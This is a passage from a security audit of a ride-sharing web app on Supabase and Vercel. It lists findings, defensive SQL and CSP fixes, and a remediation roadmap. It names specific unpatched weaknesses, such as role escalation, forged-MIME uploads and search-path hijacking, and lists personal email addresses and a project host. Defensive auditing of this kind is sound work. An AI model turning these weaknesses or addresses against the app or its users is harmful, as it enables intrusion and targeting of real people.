> "خلال الرحلة النشطة، قد يطلب التطبيق إذنك للوصول إلى موقعك الجغرافي لتحديد وصولك إلى الوجهة. تتم معالجة هذه البيانات محلياً على جهازك ولا يتم إرسالها إلى خوادمنا أو مشاركتها مع أي طرف ثالث."

(*"During an active trip the app may ask permission to access your location to detect arrival. This data is processed on your device only; it is not transmitted to our servers or shared with any third party."*)

---

## 2. High findings

### H-01 — CSP allows `'unsafe-inline'` and `'unsafe-eval'` for scripts

**Location:** `vercel.json` `script-src`.

A Vite-built React SPA with no inline `<script>` tags doesn't need either. Removing them costs nothing functionally and turns the CSP from decorative to defensive (would have mitigated **C-02**).

**Fix:** confirm no inline scripts exist (the `index.html` has only one inline `<script type="application/ld+json">` — that's a `data:` script, doesn't need `unsafe-inline`; verify after build), then:

```json
"Content-Security-Policy",
"value": "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com https://unpkg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://unpkg.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob: https: http:; connect-src 'self' https://dimtdwahtwaslmnuakij.supabase.co https://*.supabase.co wss://*.supabase.co https://nominatim.openstreetmap.org https://*.openstreetmap.de https://*.tile.openstreetmap.org https://api.maptiler.com https://*.tiles.maptiler.com https://valhalla1.openstreetmap.de; frame-ancestors 'none'; object-src 'none'; base-uri 'self'"
```

Notes added: `object-src 'none'` (defense against `<object>`-vector injection), `base-uri 'self'` (prevents `<base>` hijacking), and the MapTiler / Valhalla domains that are actually used. Verify each is needed by checking network calls in production.

`'unsafe-inline'` for `style-src` is harder to drop with Tailwind/inline `style=` props from React; can be deferred but eventually worth converting to nonce-based CSP at the Vercel edge.

### H-02 — Hardcoded anon key fallbacks

**Location:** `api/trip.js:15-16`, `DEPLOY.md:38`.

The anon key being public is fine — that's its purpose. But:
- Hardcoding it in source means rotation requires a code change AND an env-var change in two places.
- DEPLOY.md is in the repo; if the repo is ever made public the doc tells the world the anon key (they'd find it anyway from the bundled JS, but visibility != advertising).

**Fix:** drop the hardcoded fallbacks in `api/trip.js`. Fail loud at startup if env vars are missing (the supabase.js client already does, so this is just symmetric). In DEPLOY.md, replace the literal value with `<your VITE_SUPABASE_ANON_KEY>`.

### H-03 — Sentry is a stub; production has no error visibility

**Location:** `src/lib/sentry.js`.

The functions are stubs; the actual Sentry init is commented out. `captureException` just `console.error`s. After launch, you will not know about errors users hit unless they tell you.

**Fix:** wire Sentry per the TODO comments:
1. `npm i @sentry/react`
2. Set `VITE_SENTRY_DSN` in Vercel env
3. Uncomment the init block; add `denyUrls`, `beforeSend` to strip PII (already partially scaffolded), set `tracesSampleRate: 0.05` (not 0.1 — too expensive)
4. Configure source-maps upload during build (but **don't** ship source maps to the public — the current `sourcemap: false` in vite.config.js is correct; upload to Sentry directly via `@sentry/vite-plugin`).

### H-04 — Password minimum is effectively 6 chars

**Location:** `src/pages/Login.jsx:93,101`.

`if (form.password.length < 6) ...` runs first, then the strength score check. A 6-char password like `Abc123` scores 2 (mixed case +1, digit +1) → passes. Both checks gate, but the *floor* is 6 chars. Compromised-password lists are full of this length.

**Fix:** raise to 8 minimum and check against a known-breached list:
```js
if (form.password.length < 8) { toast.error('كلمة المرور 8 أحرف على الأقل'); return; }
if (passwordStrength(form.password).score < 3) { toast.error('كلمة المرور ضعيفة'); return; }
// Optional: integrate haveibeenpwned k-anonymity API to refuse breached passwords
```

Also enable Supabase's password breach detection in dashboard → Auth → Policies.

### H-05 — `SECURITY DEFINER` functions missing `SET search_path`

**Location:** `supabase-production.sql:21,30,1118,1195,1229,1499` and others.

All `SECURITY DEFINER` functions should pin their `search_path` to prevent search-path injection: an attacker who can create objects in any schema (e.g. `pg_temp` for any logged-in role) could shadow `auth.users` or `public.profiles` references and trick the function into reading attacker-controlled data.

Mishwar's functions don't expose much surface for this since the references are `auth.users` and `public.profiles` (qualified), but `RAISE EXCEPTION`, `INSERT`, etc. are called unqualified and could be hijacked through pg_temp casts. It's a one-line fix on each.

**Fix:** add `SET search_path = public, pg_catalog` to every `SECURITY DEFINER` function:
```sql
CREATE OR REPLACE FUNCTION public.auth_user_email()
RETURNS TEXT
LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public, pg_catalog
AS $$ SELECT email FROM auth.users WHERE id = auth.uid() $$;
```

### H-06 — No CAPTCHA / signup bot protection

**Location:** signup flow (`src/pages/Login.jsx`), Supabase Auth.

Supabase Auth has built-in rate limits (per-IP) but no CAPTCHA. A bot can register thousands of accounts → use them to spam notifications (**C-07**), forge reviews (**C-08**), enumerate the storage bucket (**C-03**), or simply fill the DB with junk to spike costs.

**Fix:** enable Supabase Auth's hCaptcha integration (Auth → Auth Providers → Email → "Enable Captcha protection"). Server-validates a captcha token on every signup and password reset.

### H-07 — Phone collected but never verified

Phone number is requested at registration and onboarding, validated client-side for format only. There is no SMS OTP. So:
- Anyone can claim any phone, including impersonating real numbers.
- The driver/passenger contact-flow (which uses phone) sends real users to a fake driver's number, or vice versa.

**Fix:** integrate Supabase Auth phone OTP (Auth → Phone Auth → enable Twilio). Make phone verification required for drivers; optional but encouraged for passengers.

### H-08 — Realtime publication may not be enabled

**Location:** brief notes "Channel error / Timed out" loops in console; `supabase-security.sql:226-235` includes the publication statements.

If `messages` and `notifications` aren't in `supabase_realtime` publication, the entire foreground-push and live-message-sync UX is silently broken even though the code says it's wired. The realtime channel will keep retrying and spam the console.

**Fix:** confirm and run if needed:
```sql
ALTER PUBLICATION supabase_realtime ADD TABLE public.messages;
ALTER PUBLICATION supabase_realtime ADD TABLE public.notifications;
ALTER PUBLICATION supabase_realtime ADD TABLE public.bookings;
ALTER PUBLICATION supabase_realtime ADD TABLE public.trips;
```

(Idempotency: run inside `DO $$ ... EXCEPTION WHEN duplicate_object THEN NULL; END $$;`).

### H-09 — `notif_push=false` silently drops in-app notifications

**Location:** `src/api/base44Client.js:216-220`.

The comment says it gates "all in-app notifications." The user opted out of *push* but still expects to see in-app notifications in the bell. The current behavior is a UX bug that masquerades as a privacy feature; users who turn off push will assume the app is broken when nothing shows in the bell.

**Fix:** split `notif_push` (push notifications, OS-level) from `notif_in_app` (notification feed). Default both `true`. Gate accordingly.

### H-10 — Account deletion preconditions are client-side only

**Location:** `src/pages/AccountSettings.jsx:288-314`.

The "you have N upcoming trips, cancel them first" check is a client-side `Promise.all` over Trip.filter and Booking.filter. A determined user can bypass this entirely by calling the deletion RPC directly, leaving orphaned bookings.

**Fix:** move the precondition into the `delete_user_account` RPC. RAISE EXCEPTION with translatable error code if any active trip/booking exists.

### H-11 — File upload accepts MIME by client claim only

**Location:** `src/api/base44Client.js:442` (`UploadFile`), bucket `allowed_mime_types`.

Bucket-level MIME enforcement looks at the `Content-Type` header sent by the client, which is trivially forged. A polyglot file (valid JPEG with embedded JS) could be uploaded as `image/jpeg`, and if the system ever serves it with `Content-Type: text/html` (or if HTML is returned with `image/svg+xml`), it executes.

For licenses and avatars displayed inline, the risk is moderate. For SVG (which IS in the allowed list), it's higher — SVG can contain `<script>`.

**Fix:**
1. Drop SVG from allowed MIME types unless you actually need it (the brief doesn't list it as required). Looking at the SQL — I don't see SVG in the bucket config so this is moot, but verify.
2. For drivers' licenses (PII-sensitive), validate magic bytes server-side via an Edge Function before approving the license.
3. Set `Content-Disposition: attachment` on private bucket reads so even if a malicious file slips in, it downloads instead of rendering inline.

### H-12 — `trips_update_driver` lacks `WITH CHECK`

Same class as **C-04**. Driver can change `driver_email`, change `price` after passengers booked, change `from_city` / `to_city` so the trip becomes a different trip entirely.

**Fix:** mirror the booking guard trigger on trips. Drivers can edit `available_seats` (within limits), `notes`, `pickup_time`, `car_model` (their own), `status` (within state machine: confirmed → in_progress → completed; or → cancelled). Cannot edit `driver_email`, `price` after first booking, `from_city`/`to_city` after first booking, `total_seats`.

---

## 3. Medium findings

### M-01 — N+1 query patterns

The Messages page builds `profilesByEmail` by hitting profile per conversation. The home page reloads hero slides per `app_settings` row (the brief flagged the "10 app_settings rows" issue). At 10k users you'll see Supabase quotas tighten.

**Fix:** denormalize critical fields onto messages/bookings/trips at insert time (already done partially: `passenger_name`, `driver_name`). Use materialized views or RPC for trip-search aggregations.

### M-02 — `MobileLayout.jsx.bak` checked in

Backup file in source tree. Will get bundled if anyone imports it accidentally; clutters the repo.

**Fix:** `git rm src/components/layout/MobileLayout.jsx.bak`.

### M-03 — `seed-data.sql` and credentials in repo docs

`DEPLOY.md` references `engallam27@gmail.com` and `souqnamarketplace@gmail.com` as test accounts. If repo goes public these become attack candidates. `seed-data.sql` exposes the data shape and example test users.

**Fix:** if repo stays private, no action. If public, sanitize.

### M-04 — Many large source files

`AccountSettings.jsx` 1056 lines; `Messages.jsx` 993; `CreateTrip.jsx` 983; `TripDetails.jsx` 840; `mapUtils.js` 735. Hard to review, slow to lint, increases cognitive load on new developers.

**Fix:** refactor post-launch into composable hooks + smaller components. Not blocking.

### M-05 — Consoles ship to production

20 `console.warn`/`console.error`/`console.debug` callsites in src/ + api/. Some are inside catch blocks (fine — observation). Some leak operational state (`[Realtime] Channel error on ${tableName} — will retry`). Reviewers may flag.

**Fix:** add a Vite drop-console option for production builds:
```js
// vite.config.js
import { defineConfig } from 'vite';
export default defineConfig({
  esbuild: {
    drop: process.env.NODE_ENV === 'production' ? ['console', 'debugger'] : []
  }
});
```
Then bracket developer-intent warnings with `if (import.meta.env.DEV)`.

### M-06 — Coupons table exists but `uses_count` never increments

Admin can create coupons; no client redemption code path uses them. The `uses_count` column never moves so `max_uses` is decorative. Either wire it (RPC that decrements + checks) or remove the surface to avoid security review confusion.

### M-07 — Payment methods stored in plaintext on profile

`bank_iban`, `jawwal_pay_number`, `reflect_number`, `bank_account_number` are plaintext on `profiles`, readable by any admin. For physical-world transport payments the regulatory bar is lower than card processors, but at minimum:
- IBAN is bank-disclosable; OK to store plaintext but log access.
- `bank_account_number` should be redacted to last-4 in admin UI by default.
- Encrypt these columns at rest with `pgsodium` or move to a separate audit-logged table.

### M-08 — No backup / disaster recovery procedure documented

Supabase has built-in PITR for paid plans. If you're on Free, you have point-in-time backups limited to 7 days. Pre-launch, confirm:
- Supabase plan supports the RPO you need (likely Pro for daily backups + PITR).
- Vercel deployment has rollback documented (it has one-click rollback in the dashboard but the team needs to know).
- Backup test: pick a sandbox project, restore from backup, verify integrity.

### M-09 — No on-call alerting

No Slack/PagerDuty/email alerts on Supabase quota, Vercel function errors, or auth failures.

**Fix:** Vercel → Settings → Notifications → enable email on deployment failures. Supabase → Reports → set quota alert. Add an UptimeRobot or Pingdom HTTPS check on `/` and `/api/trip?id=<known-trip>`.

### M-10 — No rate limiting on `/api/trip` or `/api/og`

Vercel functions have soft limits but no app-level throttle. An attacker can hammer `/api/trip?id=<random uuid>` and exhaust your function-invocation quota.

**Fix:** add a simple in-memory or Upstash Redis rate-limit (10 req/sec/IP) at the top of each handler. For known-bad UAs, reject early.

### M-11 — Open Graph cache is too aggressive

`api/trip.js` sets `s-maxage=60, stale-while-revalidate=300`. If a driver edits their trip price, search engines and link-previewers see the old price for up to 6 minutes. For shared trip URLs that cache duration may also exceed the trip's lifetime.

**Fix:** lower to `s-maxage=30, stale-while-revalidate=60` and set `Cache-Control: private, no-store` on the `/trip/:id` SPA path.

### M-12 — `available_seats` can be negative if trigger paths change

The current trigger uses `GREATEST(0, ...)` which clamps. But once **C-06** is fixed via the RPC, ensure the column-level CHECK constraint catches future bugs:

```sql
ALTER TABLE public.trips
  DROP CONSTRAINT IF EXISTS trips_available_seats_check,
  ADD CONSTRAINT trips_available_seats_check
    CHECK (available_seats >= 0 AND available_seats <= total_seats);
```

### M-13 — Hardcoded test driver emails in handoff brief

`testdriver@mishware.com`, `femaldriver@mishware.com`. Note the typo (`mishware` vs `mishwar`). If these accounts were created with predictable passwords and exist in production, they're attack targets. Confirm they don't exist on prod or have strong/disabled passwords.

### M-14 — No dependency update strategy

`npm audit` is clean today, but the lockfile is 298KB and the deps will rot. No Renovate/Dependabot config in repo.

**Fix:** add `.github/dependabot.yml` (npm + actions ecosystems, weekly cadence).

---

## 4. Low findings

| # | Finding | Notes |
|---|---|---|
| L-01 | No `robots.txt` strategy beyond `<meta name="robots" content="index,follow">` | Add explicit `/robots.txt` and `/sitemap.xml`. |
| L-02 | No favicon for Safari pinned tabs (`mask-icon`) | Cosmetic. |
| L-03 | `vercel.json` `Permissions-Policy` allows `microphone=()` (correct) but `camera=(self)` — confirm camera is actually needed (license selfie capture?). | Tighten if not used. |
| L-04 | `og-trip-placeholder.png` referenced as static OG image; doesn't reflect actual trip | Per-trip generated OG image (already pending) would help. |
| L-05 | `Cookie` policy: app uses localStorage for auth, not cookies — privacy policy says "essential cookies only," but in practice no cookies are set at all. | Reword for accuracy. |
| L-06 | No `lang="ar"` on body inside `index.html` (it's on `<html>`). Fine for accessibility, just noting. | None. |
| L-07 | No "Last updated" timestamp visible on Privacy Policy / Terms detail pages beyond the static "أبريل 2026". | Auto-stamp from build date or Git. |
| L-08 | Several `localStorage.getItem(`sb-${PROJECT_REF}-auth-token`)` reads without try/catch wrapping the `JSON.parse` — fixed in some places, not all. | Standardize via a `readSession()` util used everywhere. |
| L-09 | Some toasts contain raw error strings from Supabase (`err.message || 'فشل'`) — could leak schema details. | Whitelist user-friendly messages by error code. |
| L-10 | `useStoreReview.js` exists — implies Capacitor or store-rating prompt; verify it doesn't fire pre-launch in web-only mode. | Verify. |
| L-11 | Manifest has only 2 icon sizes (192/512). iOS PWA wants 180px, splash screens for various devices. | Add per Apple's PWA spec. |

---

## 5. Per-domain audit summary

### 5.1 Authentication & Authorization

| Item | Status |
|---|---|
| Email/password auth | ✅ Supabase Auth |
| Token expiration | ✅ JWT 1h, refresh 1 week (default Supabase) |
| Multi-device sessions | ✅ Supabase handles automatically |
| Session storage | ⚠️ localStorage (XSS-readable; no httpOnly cookie option) |
| Privilege escalation | ❌ **C-01** — trivial |
| Role enforcement | ❌ Client-side only on `/dashboard`; server-side broken (**C-01**) |
| MFA / 2FA | ❌ Not implemented |
| Password breach check | ❌ |
| OAuth (Google, etc.) | ❌ Not implemented (could be acceptable for v1) |
| SSO test surface | N/A |

### 5.2 API security

| Item | Status |
|---|---|
| Input validation client-side | ✅ `sanitizeText`, `getContactViolation` |
| Server-side validation | ⚠️ Some via DB constraints + RLS; gaps in `bookings`, `trips`, `messages` UPDATEs |
| SQL injection | ✅ PostgREST + parameterized RPCs |
| API rate limiting | ❌ App-level absent; relying on Supabase + Vercel defaults |
| CORS | ✅ Vercel + Supabase defaults |
| Sensitive data in URLs | ⚠️ Trip ID in URL is fine; user UUID never appears in URL ✅ |
| Error messages leak schema | ⚠️ Some Supabase errors surface verbatim |
| Reflected XSS | ❌ **C-02** |

### 5.3 Database

| Item | Status |
|---|---|
| RLS enabled all tables | ✅ |
| RLS correctness | ❌ Multiple holes (**C-01, C-04, C-07, C-08, C-09, H-12**) |
| Proper indexes | ✅ Mostly; `idx_trips_search`, `idx_bookings_composite`, `idx_profiles_role` etc. |
| FK relationships | ⚠️ `trip_id` is `TEXT` not `UUID` in `bookings` (mixed types complicate indexes) |
| Backup strategy | ❌ Not documented (**M-08**) |
| Encryption at rest | ✅ Supabase default (AES-256) |
| Sensitive columns encrypted | ❌ IBAN, bank fields plaintext (**M-07**) |
| Audit log table | ✅ `admin_audit_log` |

### 5.4 Infrastructure

| Item | Status |
|---|---|
| Env-var management | ✅ Vercel env vars + `.gitignore` excludes `.env` |
| Secret leakage | ⚠️ Anon key hardcoded in `api/trip.js` and `DEPLOY.md` (**H-02**) |
| HTTPS enforcement | ✅ Vercel HSTS |
| Cloud misconfig | ❌ Storage bucket public (**C-03**) |
| Logging | ⚠️ Vercel function logs only; no Loggly/Datadog/centralized |
| CI/CD | ⚠️ Vercel auto-deploy on push, no preview-environment strategy documented |
| Admin panel exposure | ⚠️ `/dashboard` route public; client gate only |

### 5.5 Client-side

| Item | Status |
|---|---|
| XSS sinks (`dangerouslySetInnerHTML`, `innerHTML`, `eval`, `document.write`) | ✅ None in src/ or api/ — clean |
| Secrets in bundle | ✅ Only the anon key (intended) |
| localStorage misuse | ⚠️ Auth token in localStorage; standard for SPA but vulnerable if any XSS lands |
| Source maps in prod | ✅ `sourcemap: false` |
| Service-worker offline | ❌ Not implemented |

### 5.6 Payments / financial

| Item | Status |
|---|---|
| Payment processor integration | N/A (cash + Jawwal Pay + Reflect + bank — physical-world transport, IAP exempt) |
| Payment-status integrity | ❌ **C-04** |
| Refund integrity | ❌ Same |
| Commission accounting | ⚠️ `commission_rate` in app_settings, no enforcement code yet |

### 5.7 Performance

| Frontend |  |
|---|---|
| Bundle splitting | ✅ Manual chunks in vite.config.js |
| Lazy routing | ✅ `lazy(...)` on every page |
| Largest chunk | `vendor-charts` 421KB → 114KB gzipped (recharts is heavy; lazy-load it only on dashboard) |
| Image optimization | ⚠️ `og-image.png` is a static file; no `next/image`-equivalent. Tile/avatar images are direct URLs. Consider `loading="lazy"` audit. |
| Render performance | ✅ React.memo not abused; fine for current scale |
| **Backend** |  |
| Query latency | ⚠️ N+1 risks (**M-01**) |
| API response time | ⚠️ Function cold-starts on `/api/trip` add 200-500ms |
| Caching strategy | ⚠️ Edge cache via `s-maxage` on OG endpoint; nothing else |
| Concurrency | ❌ Booking flow is non-atomic (**C-06**) |

### 5.8 Mobile/PWA

| Item | Status |
|---|---|
| Manifest | ✅ Basic |
| iOS install flow | ⚠️ Required for iOS Web Push; UX missing |
| Push notifications | ⚠️ Foreground only; no service worker for closed-tab |
| Touch targets | ✅ Recent commits enforced 44px+ |
| Capacitor wrapper | ❌ Not built (pending) |
| App Store assets | ❌ |
| Play Store assets | ❌ |

### 5.9 Privacy & compliance

| Item | Status |
|---|---|
| Privacy policy | ⚠️ Exists, not lawyer-reviewed; **C-10** |
| Terms of service | ⚠️ Exists, not lawyer-reviewed |
| GDPR Art. 17 (right to erasure) | ❌ **C-05** |
| GDPR Art. 32 (security) | ❌ **C-03** |
| CCPA "Do Not Sell" mechanism | ❌ Not present (mishwar may not need depending on user residency) |
| PIPEDA disclosures | ❌ |
| Cookie banner | ❌ App uses localStorage not cookies; arguably exempt — confirm with counsel |
| Consent tracking | ❌ |
| Sub-processor list | ❌ Supabase, Vercel, Nominatim, Valhalla, MapTiler unlisted |

### 5.10 Business logic

| Flow | Status |
|---|---|
| Signup/login | ✅ Solid; needs CAPTCHA + phone verify |
| Trip creation | ✅ Driver eligibility checks present |
| Search/filter | ✅ Indexed |
| Booking | ❌ **C-06** race + **C-04** integrity |
| Cancellation | ✅ RPC-gated |
| Payments | ❌ **C-04** |
| Reviews | ❌ **C-08** |
| Messaging | ⚠️ **C-09** + receiver-edit |
| Notifications | ❌ **C-07** |
| Reports/blocks | ✅ Recent commits; in good shape |
| Admin actions | ⚠️ Audit log present but **C-01** undermines the whole concept |

---

## 6. Priority fix roadmap

### Phase 0 — Stop-the-bleeding (deploy in a single SQL migration + 1 code PR before any public traffic)

Estimated effort: **1 senior dev × 3 working days**.

1. **C-01** — Lock `profiles_update` to forbid role changes; add guard trigger.
2. **C-04** — `guard_booking_updates` BEFORE-UPDATE trigger; same-pattern on `trips`.
3. **C-07** — Tighten `notifications_insert` policy.
4. **C-09** — Split `messages_update` policies; add receiver-column guard trigger.
5. **C-08** — `guard_review_must_have_booking` trigger + unique index.
6. **C-02** — Add `esc()` to `api/og.js`.
7. **C-03** (storage) — at minimum, immediately tighten storage UPDATE/DELETE/INSERT policies to require ownership; flip license bucket to private + signed URLs.
8. **H-05** — `SET search_path` on every SECURITY DEFINER function (5-min mechanical fix).
9. **H-08** — Confirm + run realtime publication adds.
10. Roll any new admin role assignments through SQL only after auditing existing `role='admin'` rows.

### Phase 1 — Pre-launch (within the next 7-10 days)

1. **C-05** — Account deletion via the RPC; add email anonymization across denormalized columns.
2. **C-06** — `book_seat` RPC; remove client-side decrement and AFTER-INSERT decrement trigger.
3. **C-10** — Lawyer-reviewed Privacy Policy + Terms; rewrite GPS section.
4. **H-01** — Tighten CSP (drop `unsafe-inline`/`unsafe-eval`).
5. **H-02** — Remove hardcoded anon-key fallbacks.
6. **H-03** — Wire Sentry.
7. **H-04** — Raise password floor to 8 chars + breach check.
8. **H-06** — Enable hCaptcha on signup.
9. **H-12** — `guard_trip_updates` trigger.
10. **M-08** — Document backup + verify Supabase plan.
11. **M-09** — Set up basic alerts (Vercel email, Supabase quota, UptimeRobot).
12. App Store / Play Store privacy nutrition labels.

### Phase 2 — First 30 days post-launch

1. **C-09** — Consider message edit-history retention.
2. **H-07** — Twilio SMS OTP for phone verification (drivers required).
3. **H-09** — Split `notif_push` from `notif_in_app`.
4. **H-10** — Move precondition checks for delete into RPC.
5. **H-11** — Magic-byte validation for license uploads.
6. **M-01** — Address N+1 (denormalize, materialized view).
7. **M-05** — Drop console statements in prod build.
8. **M-07** — Encrypt sensitive payment columns.
9. **M-10** — App-level rate limiting.
10. **M-14** — Dependabot config.
11. Capacitor wrapper for iOS / Android stores.
12. Service-worker push notifications + iOS PWA install flow.

### Phase 3 — Architecture improvements (90 days)

1. Refactor 1000+ line files into composable hooks.
2. Add e2e tests (Playwright) covering: signup, trip creation, booking, cancellation, refund, deletion, block, report.
3. Move review-rating recalculation from synchronous trigger to async job; current trigger blocks INSERT on full table scan as `reviews` grows.
4. Migrate denormalized email columns to FK references on `profiles.id`; the email-as-PK pattern is fragile (changes break, deletion is complex).
5. Add a `payments_ledger` append-only table for audit trail; current `bookings.payment_status` is mutable single-state.
6. WAF (Cloudflare or Vercel firewall) for IP/geo throttling.
7. Penetration test by an external firm before scaling beyond ~5k MAU.
8. Bug bounty program (HackerOne or Intigriti) once security baseline is solid.

---

## 7. Things that are good

It's worth being explicit about what's working — partly so a junior reviewing this audit doesn't start tearing apart the bones:

- **RLS is enabled on every business table.** The discipline is there; the bugs above are individual policy errors, not "we forgot RLS."
- **Defense-in-depth scaffolding exists:** the `messages_block_send_to_deleted` RESTRICTIVE policy is exemplary; the `prevent_self_booking` trigger is solid; the `cancel_booking` RPC properly verifies caller identity.
- **The error-boundary structure is good** — top-level + per-page fallbacks; that's well-considered.
- **Code splitting is aggressive and correct** — every page lazy-loaded, manual vendor chunks tuned.
- **The XSS-sink scan is clean** — no `dangerouslySetInnerHTML`, `innerHTML`, `eval`, or `document.write` anywhere in src/ or api/. That's rare.
- **`vercel.json` security headers** are 80% there: HSTS, frame-ancestors, Referrer-Policy, X-Content-Type-Options. CSP is the one big gap.
- **Block + report system** is well-thought-out: cache invalidation, reporter feedback, audit trail, drawer entries — recent commits show maturity.
- **The handoff brief itself** is unusually detailed and honest about pending work; that signals good engineering practice on the team.

The app is a quarter-turn from being a lot safer than its current state. The fixes above are concrete, scoped, and most can deploy in a single migration. None require architectural rewrites.

---

## 8. Audit limitations & assumptions

- This audit was static. No live exploit was run. The findings are based on code/SQL review and inference; **C-01, C-04, C-07, C-08** should be confirmed in a staging environment with actual exploit attempts before assuming the analysis is right (it should be — the code reads unambiguously — but a 2-minute confirm is cheap).
- I did not have access to the Supabase Auth dashboard settings, so I couldn't verify whether email confirmation is on, what password policy is set, what rate limits are configured, or whether the realtime publication actually has `messages` and `notifications` listed.
- I did not audit the `process_booking_payment` RPC because its body wasn't in the SQL files (the brief states it's deployed). It needs review — exactly the same column-update guardrails apply to whatever flow it implements.
- I did not run the app in a browser, so dynamic-only issues (Service Worker quirks, hydration mismatches, race conditions in click handlers, accessibility audit, mobile gesture conflicts) are not covered. A separate manual QA pass is warranted.
- The handoff brief is treated as factual context — if the brief is wrong about live RLS state, the conclusions about that policy's behavior are wrong. The privacy escalation finding is independent (the SQL in the repo speaks for itself).
- App Store / Play Store policies change. The compliance findings are correct as of the dates in the audit header but should be re-checked at submission time.

---

*End of audit.*
